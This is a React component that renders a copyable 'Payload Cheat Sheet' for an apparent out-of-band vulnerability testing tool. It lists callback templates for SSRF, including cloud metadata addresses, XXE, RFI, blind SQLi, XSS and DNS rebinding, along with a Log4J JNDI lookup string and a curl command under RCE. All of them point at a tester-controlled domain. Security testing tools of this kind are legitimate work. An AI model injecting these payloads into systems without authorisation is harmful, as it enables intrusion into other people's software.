'use client'

import { useState } from 'react'

interface CheatSheetItem {
  id: string
  name: string
  template: string
  category: string
  risk: string
}

const cheatSheetItems: CheatSheetItem[] = [
  // SSRF
  { id: 'ssrf-basic', name: 'SSRF HTTP', template: 'http://{token}.{domain}/', category: 'SSRF', risk: 'high' },
  { id: 'ssrf-redirect', name: 'SSRF Redirect', template: 'http://{token}.{domain}/redirect', category: 'SSRF', risk: 'high' },
  { id: 'ssrf-aws-meta', name: 'SSRF AWS Metadata', template: 'http://169.254.169.254/{token}.{domain}', category: 'SSRF', risk: 'critical' },
  { id: 'ssrf-gcp-meta', name: 'SSRF GCP Metadata', template: 'http://metadata.google.internal.{token}.{domain}', category: 'SSRF', risk: 'critical' },

  // XXE / Injection
  { id: 'xxe-basic', name: 'XXE External Entity', template: 'http://{token}.{domain}/xxe', category: 'XXE & Injection', risk: 'high' },
  { id: 'rfi', name: 'RFI Remote File', template: 'http://{token}.{domain}/file.php', category: 'XXE & Injection', risk: 'high' },
  { id: 'blind-sqli', name: 'Blind SQLi (HTTP)', template: 'http://{token}.{domain}/sql?id=1', category: 'XXE & Injection', risk: 'high' },
  { id: 'log4j', name: 'Log4J JNDI', template: '${jndi:ldap://{token}.{domain}/exp}', category: 'XXE & Injection', risk: 'critical' },
  { id: 'ssti', name: 'SSTI Probe', template: '{token}.{domain}', category: 'XXE & Injection', risk: 'high' },

  // RCE
  { id: 'rce-basic', name: 'RCE HTTP Probe', template: 'http://{token}.{domain}/cmd', category: 'RCE', risk: 'critical' },
  { id: 'rce-command', name: 'RCE Curl', template: 'curl http://{token}.{domain}', category: 'RCE', risk: 'critical' },
  { id: 'deserialization', name: 'Java Deserialize', template: 'http://{token}.{domain}/object', category: 'RCE', risk: 'critical' },

  // Client-side
  { id: 'xss', name: 'XSS Reflected', template: 'http://{token}.{domain}/xss', category: 'Client-side', risk: 'medium' },
  { id: 'cors', name: 'CORS JSONP', template: 'http://{token}.{domain}/callback', category: 'Client-side', risk: 'medium' },

  // Network
  { id: 'dns-rebind', name: 'DNS Rebinding', template: 'http://{token}.{domain}/rebind', category: 'Network', risk: 'high' },
  { id: 'smtp', name: 'SMTP Injection', template: '{token}@{domain}', category: 'Network', risk: 'medium' },
]

const riskColors: Record<string, string> = {
  critical: 'bg-red-100 text-red-800',
  high: 'bg-orange-100 text-orange-800',
  medium: 'bg-yellow-100 text-yellow-800',
  low: 'bg-blue-100 text-blue-800',
}

async function copyToClipboard(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text)
    return true
  } catch {
    return false
  }
}

export function PayloadCheatSheet() {
  const [isOpen, setIsOpen] = useState(false)
  const [collapsedCats, setCollapsedCats] = useState<Set<string>>(new Set())
  const [copiedId, setCopiedId] = useState<string | null>(null)

  // Group by category
  const categories = cheatSheetItems.reduce((acc, item) => {
    if (!acc[item.category]) acc[item.category] = []
    acc[item.category].push(item)
    return acc
  }, {} as Record<string, CheatSheetItem[]>)

  const toggleCat = (cat: string) => {
    setCollapsedCats((prev) => {
      const next = new Set(prev)
      if (next.has(cat)) next.delete(cat)
      else next.add(cat)
      return next
    })
  }

  const handleCopy = async (item: CheatSheetItem) => {
    const ok = await copyToClipboard(item.template)
    if (ok) {
      setCopiedId(item.id)
      setTimeout(() => setCopiedId(null), 2000)
    }
  }

  return (
    <div className="border rounded-lg">
      <button
        className="flex justify-between items-center w-full px-4 py-3 bg-gray-50 hover:bg-gray-100 rounded-t-lg font-medium text-sm"
        onClick={() => setIsOpen(!isOpen)}
      >
        <span>🧰 Payload Cheat Sheet</span>
        <span className="text-gray-400">{isOpen ? '▼' : '▶'}</span>
      </button>

      {isOpen && (
        <div className="p-4 space-y-3">
          {Object.entries(categories).map(([cat, items]) => (
            <div key={cat} className="border rounded">
              <button
                className="flex justify-between items-center w-full px-3 py-2 bg-gray-50 hover:bg-gray-100 text-sm font-medium text-gray-700"
                onClick={() => toggleCat(cat)}
              >
                <span>{cat} ({items.length})</span>
                <span>{collapsedCats.has(cat) ? '▶' : '▼'}</span>
              </button>

              {!collapsedCats.has(cat) && (
                <div className="divide-y">
                  {items.map((item) => (
                    <div key={item.id} className="flex items-center gap-2 px-3 py-2 text-sm">
                      <span className="flex-1 font-mono text-xs truncate">{item.template}</span>
                      <span className={`text-xs px-1.5 py-0.5 rounded ${riskColors[item.risk] || ''}`}>
                        {item.risk}
                      </span>
                      <button
                        onClick={() => handleCopy(item)}
                        className="text-xs px-2 py-1 bg-white border rounded hover:bg-gray-50 shrink-0"
                      >
                        {copiedId === item.id ? 'Copied!' : 'Copy'}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          ))}

          <div className="text-xs text-gray-400 mt-2">
            Replace {'{token}'} and {'{domain}'} with your actual values.
          </div>
        </div>
      )}
    </div>
  )
}
